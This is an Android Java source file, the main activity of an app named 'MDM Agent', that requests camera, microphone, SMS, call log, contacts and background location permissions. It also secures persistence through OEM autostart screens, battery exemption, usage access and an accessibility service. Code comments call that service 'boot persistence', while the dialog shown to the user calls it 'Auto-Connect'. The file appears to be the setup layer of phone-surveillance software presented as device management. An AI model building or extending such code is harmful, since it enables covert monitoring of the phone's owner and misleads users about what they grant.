package com.mdmagent.app;

import android.Manifest;
import android.app.AlertDialog;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {

    private static final int PERM_REQUEST_CODE = 1001;

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(MdmPlugin.class);
        registerPlugin(NativeSocketPlugin.class);
        super.onCreate(savedInstanceState);
        startForegroundService(new Intent(this, MdmForegroundService.class));
        requestMissingPermissions();
        requestBatteryOptimizationExemption();
        requestUsageAccessIfNeeded();
        requestOemAutoStart();
        requestAccessibilityIfNeeded();  // most reliable boot persistence
    }

    // ── OEM AutoStart (critical for boot persistence on Chinese OEMs) ──
    private void requestOemAutoStart() {
        String mfr = Build.MANUFACTURER.toLowerCase();
        boolean isMiui = isMiui() || mfr.contains("xiaomi") || mfr.contains("redmi");

        if (isMiui) {
            showAutoStartDialog();
        } else {
            openOemAutoStartDirect(mfr);
        }
    }

    private void showAutoStartDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Enable AutoStart (Required)")
            .setMessage(
                "For MDM Agent to stay connected after phone restart, you MUST enable AutoStart.\n\n" +
                "Steps:\n" +
                "1. Click OK — AutoStart screen will open\n" +
                "2. Find 'MDM Agent' in the list\n" +
                "3. Toggle it ON\n\n" +
                "This is a ONE-TIME setup.")
            .setCancelable(false)
            .setPositiveButton("Open AutoStart Settings", (d, w) -> openMiuiAutoStart())
            .setNegativeButton("Skip (not recommended)", null)
            .show();
    }

    private void openMiuiAutoStart() {
        String[][] targets = {
            { "com.miui.securitycenter",
              "com.miui.permcenter.autostart.AutoStartManagementActivity" },
            { "com.miui.securitycenter",
              "com.miui.permcenter.MainAcitivity" },
            { "com.miui.securitycenter",
              "com.miui.securitycenter.MainActivity" },
        };
        for (String[] t : targets) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(t[0], t[1]));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return;
            } catch (Exception ignored) {}
        }
        // Fallback: open app details so user can find battery/autostart settings manually
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private void openOemAutoStartDirect(String mfr) {
        try {
            Intent intent = new Intent();
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (mfr.contains("huawei") || mfr.contains("honor")) {
                intent.setComponent(new ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (mfr.contains("oppo") || mfr.contains("realme")) {
                intent.setComponent(new ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.privacypermissionsentry.PermissionTopActivity"));
            } else if (mfr.contains("vivo")) {
                intent.setComponent(new ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
            } else if (mfr.contains("samsung")) {
                intent.setComponent(new ComponentName(
                    "com.samsung.android.lool",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"));
            } else {
                return;
            }
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private boolean isMiui() {
        try { Class.forName("miui.os.Build"); return true; }
        catch (ClassNotFoundException e) { return false; }
    }

    // ── Accessibility Service (most reliable boot persistence) ─────────
    private void requestAccessibilityIfNeeded() {
        if (isAccessibilityEnabled()) return; // already on, skip
        new AlertDialog.Builder(this)
            .setTitle("⚡ Enable Auto-Connect (ONE TIME)")
            .setMessage(
                "To connect automatically after phone restart without opening app:\n\n" +
                "1. Tap 'Open Settings'\n" +
                "2. Find 'MDM Agent' in the list\n" +
                "3. Tap it → Toggle ON → Allow\n\n" +
                "This is a ONE-TIME setup. After this, phone auto-connects on every restart.")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) ->
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)))
            .setNegativeButton("Skip", null)
            .show();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String service = getPackageName() + "/" + MdmAccessibilityService.class.getName();
            int enabled = Settings.Secure.getInt(
                getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 1) {
                String enabledServices = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (enabledServices != null) {
                    TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
                    splitter.setString(enabledServices);
                    while (splitter.hasNext()) {
                        if (splitter.next().equalsIgnoreCase(service)) return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void requestUsageAccessIfNeeded() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 60_000, now);
            boolean granted = stats != null && !stats.isEmpty();
            if (!granted) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    private void requestMissingPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                missing.add(perm);
        }
        if (!missing.isEmpty())
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERM_REQUEST_CODE);
        else
            requestBackgroundLocation();
    }

    private void requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                new String[]{ Manifest.permission.ACCESS_BACKGROUND_LOCATION }, PERM_REQUEST_CODE + 1);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQUEST_CODE) {
            startForegroundService(new Intent(this, MdmForegroundService.class));
            requestBackgroundLocation();
        }
    }
}
